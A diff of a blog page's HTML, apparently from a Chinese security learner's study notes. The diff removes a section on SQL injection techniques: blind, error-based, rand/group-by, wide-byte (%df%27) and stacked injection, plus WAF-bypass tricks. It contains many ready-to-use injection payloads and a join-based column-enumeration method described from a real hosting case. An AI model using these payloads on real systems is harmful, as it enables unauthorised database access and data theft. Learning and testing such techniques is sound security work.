@@ -173,71 +173,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="0x01-总记"><a href="#0x01-总记" class="headerlink" title="0x01 总记"></a>0x01 总记</h1><p>​        学习渗透测试，web安全很长时间了，没有提交过任何漏洞，看过一些课程只能挖到一些小厂的洞，挖不到src和众测，感觉自己的实力不够。个人认为是知识没有成体系，许多知识点存在盲区，需要梳理一遍来巩固印象，也需要配合一些实战来加深印象，最近不断地问自己，想出自己的不足之处，希望能够通过梳理这篇自己的盲区。可以看到之前的一些博客也有一些知识点的记录和梳理，但是最终都没有坚持下来，希望这次能坚持把自己认为的盲区梳理透彻，能够有较大的收获。</p>
-<h1 id="0x02-SQL注入部分"><a href="#0x02-SQL注入部分" class="headerlink" title="0x02 SQL注入部分"></a>0x02 SQL注入部分</h1><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>​        使用and判断真假，如<code>id=-1&#39; or ascii(substr((select database()),0,1))&gt;100--+</code>根据页面返回的情况来判断条件是否成立</p>
-<ul>
-<li><p>判断数据库长度</p>
-<p><code>?id=1&#39; and length(database())=8--+</code></p>
-</li>
-<li><p>判断数据库名</p>
-<p><code>id=-1&#39; or ascii(substr((select database()),0,1))&gt;100--+</code></p>
-</li>
-</ul>
-<p>后面爆表爆列爆字段就是往常一样，将select database()语句更换为要使用的语句就行了</p>
-<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>​        时间盲注得话基本上我个人觉得和布尔盲注差不多，不过是多使用if()判断和sleep()函数，如<code>?id=1&#39; and if(length(select (database())&gt;10,sleep(5),1)--+</code> 然后将length函数换为ascii函数，并辅以substr函数即可。</p>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>​    报错注入分为两种，<strong>一种是xpath报错</strong>，使用extractvalue(xml_document,Xpath_string)与updatexml(xml_document,xpath_string,new_value)函数，利用~、#、$等不能满足xpath_string格式的字符使报错，而报错信息中含有查询结果；<strong>另一种</strong>则利用floor(rand(0)<em>2)、count(\</em>)、group by形成虚拟表插入失败报错</p>
-<h3 id="xpath报错注入"><a href="#xpath报错注入" class="headerlink" title="xpath报错注入"></a>xpath报错注入</h3><ul>
-<li><p>extractvalue(xml_document,Xpath_string)函数</p>
-<ul>
-<li><code>select extractvalue(1,concat(&#39;~&#39;,(select version())));</code></li>
-<li><code>select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())));</code></li>
-<li><code>select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)));</code></li>
-</ul>
-<p><strong>注意extractvalue函数能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</strong></p>
-</li>
-<li><p>updatexml(xml_document,xpath_string,new_value)函数</p>
-<ul>
-<li><code>select updatexml(1,concat(0x7e,(select version())),0x7e);</code></li>
-<li><code>select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),0x7e);</code></li>
-<li><code>select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e);</code></li>
-</ul>
-</li>
-</ul>
-<h2 id="concat-rand-group-by-导致主键重复"><a href="#concat-rand-group-by-导致主键重复" class="headerlink" title="concat+rand()+group_by()导致主键重复"></a>concat+rand()+group_by()导致主键重复</h2><p>​        原理大概是rand(0)<em>2产生规律性的随机数，group by在确定本次结果在虚拟表中不存在时会再一次进行计算后插入虚拟表中，如语句`select count(</em>),(concat(floor(rand(0)<em>2),‘@’,(select version())))x from TABLE_NAME group by x`，如果rand(0)\</em>2随机出0101（例如），在第一次运算rand(0)值为0，group by 检测<a href="mailto:0@5.6.17">0@5.6.17</a>查询虚拟表中无此项时将进行插入，插入前再进行一次运算后rand(0)值为1结果变为<a href="mailto:1@5.6.17">1@5.6.17</a>，插入虚拟表内；第二次检测时rand(0)值为0，结果为<a href="mailto:0@5.6.17">0@5.6.17</a>，表内没有（注意到此时表内只有一项<a href="mailto:1@5.6.17">1@5.6.17</a>），group by准备进行插入，而插入前在进行一次rand(0)运算值为1，导致结果变为<a href="mailto:1@5.6.17">1@5.6.17</a>，插入后与表内项重复导致报错并且将运算结果显示在报错信息中导致报错注入。</p>
-<p>​        此处用rand(0)*2的原因是因为rand函数在给定种子的情况下产生的随机数序列是有规律的可以稳定触发报错。</p>
-<ul>
-<li><code>select count(*),(concat(floor(rand(0)*2),&#39;@&#39;,(select version())))x from TABLE_NAME group by x;</code></li>
-<li><code>select count(*),(concat(floor(rand(0)*2),&#39;@&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database())))x from TABLE_NMAE group by x;</code> ，此处的TABLE_NAME应是一个足够大的表，如information_schema.tables；</li>
-<li><code>select count(*),(concat(floor(rand(0)*2),&#39;@&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)))x from TABLE_NMAE group by x;</code></li>
-</ul>
-<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>​        宽字节注入的原理是当客户端、连接层、数据库使用字符集不同时，需要将输入/输出的字符按照客户端-&gt;数据库/数据库-&gt;客户端进行字符集转换，此时攻击者能够构造一定的字符来达到在编码后产生一定的字符将addslashes函数产生的转义符转义使得%27能够逃逸，从而闭合sql语句达到SQL注入。</p>
-<p>​        针对addslashes()函数（对输入的危险变量进行添加\进行转义），由于在gbk编码中，\编码为%5c，宽字节注入的原理就是通过人为的添加一个编码%xx使得此编码与%5c形成汉字来达到绕过的目的，如%DE,%DF,%E0等</p>
-<p><img src="/2021/09/09/39-%E7%AC%94%E8%AE%B0%E5%BF%83%E5%BE%97%E6%95%B4%E7%90%86/1.png" alt></p>
-<p>此处有三种情况</p>
-<ul>
-<li><p>UTF-8 -&gt;GBK 数据库字符设定为GBK，使用addslashes函数进行过滤</p>
-<p>​        此时可使用%df%27，发生：%df%27=====(addslashes)======&gt;%df%5c%27======(GBK)======&gt;運’</p>
-</li>
-<li><p>GBK -&gt; UTF8 数据库字符设置为UTF-8，使用addslashes函数过滤后使用iconv函数将GBK转换为UTF-8字符</p>
-<p>​        此时使用%e5%5c%27，发生：e55c27====(addslashes)====&gt;<strong>e55c</strong>5c5c27====(iconv)====&gt;<strong>e98ca6</strong>5c5c27</p>
-</li>
-<li><p>UTF-8 -&gt; GBK 数据库编码设置为GBK，使用iconv进行字符集转换，当先使用iconv编码后使用addslashes转义时（此条件较为苛刻）</p>
-<p>​        此时使用%e9%8c%a6，发生：e98ca6====(iconv)=====&gt;e55c=====(addslashes)====&gt;e55c5c2</p>
-</li>
-</ul>
-<p>针对宽字节注入的方案是使用mysql_set_charset(GBK)&amp;&amp;mysql_real_string_escape()函数，原因是mysql_real_string_escape函数在转义时会根据mysql_set_charset函数指定的字符集来进行转义，从而避免了转义后字符拼接导致的字符逃逸。<strong>这两者缺一不可。</strong></p>
-<p>所以说，如果使用了mysql_real_string_escape函数但是没有使用mysql_set_charset(GBK)时，我们依然能够使用宽字节注入，此时有：</p>
-<ul>
-<li><p>利用%df突破</p>
-<p>%df%27</p>
-</li>
-<li><p>利用 ‘ 的utf-16突破</p>
-<p>%EF%BF%BD%27</p>
-</li>
-</ul>
-<h2 id="堆注入"><a href="#堆注入" class="headerlink" title="堆注入"></a>堆注入</h2><p>​        堆注入，原理是在一条数据库语句结束之后用分号结尾后面再接一句数据库查询语句来达到执行多条数据库语句的目的，看了很多博客，没有看到写堆注入发生的条件的博客，这么来看，堆注入相比起来是最简单的注入，如果存在堆注入的话基本上就能使用纯数据库语言来进行注入，也有可能这个注入发生的条件比较苛刻，hh</p>
-<h2 id="user-agent注入"><a href="#user-agent注入" class="headerlink" title="user-agent注入"></a>user-agent注入</h2><h2 id="cookies注入"><a href="#cookies注入" class="headerlink" title="cookies注入"></a>cookies注入</h2><h2 id="反序列化注入"><a href="#反序列化注入" class="headerlink" title="反序列化注入"></a>反序列化注入</h2><h2 id="SQL注入bypass姿势"><a href="#SQL注入bypass姿势" class="headerlink" title="SQL注入bypass姿势"></a>SQL注入bypass姿势</h2><p>​        对于sql注入的bypass注入，今天下午看了几本书，总结起来大概就是大小写、双写、使用%0a，%0b，等绕过空格过滤、编码绕过、使用title的字长限制绕过、/*!%53eLEct*/绕过</p>
-<p>​        遇到一个阿里云虚拟主机案例，数字型注入，mysql数据库，屏蔽了information_schema.tables等表，由于此案例有报错信息，可得到当前表名，因此可使用join报错注入<code>and（select * from (select * from TABLE_NAME a join TABLE_NAME b)c)</code>爆出第一列列名，假如是id，则下一次使用<code>and（select * from (select * from TABLE_NAME a join TABLE_NAME b using(id))c)</code>爆出第二列列名，以此类推即可爆出当前数据库所有表名。</p>
-
+        
+          <a class="article-more-a" href="/2021/09/09/39-%E7%AC%94%E8%AE%B0%E5%BF%83%E5%BE%97%E6%95%B4%E7%90%86/#more">more >></a>
+        
       
 
       
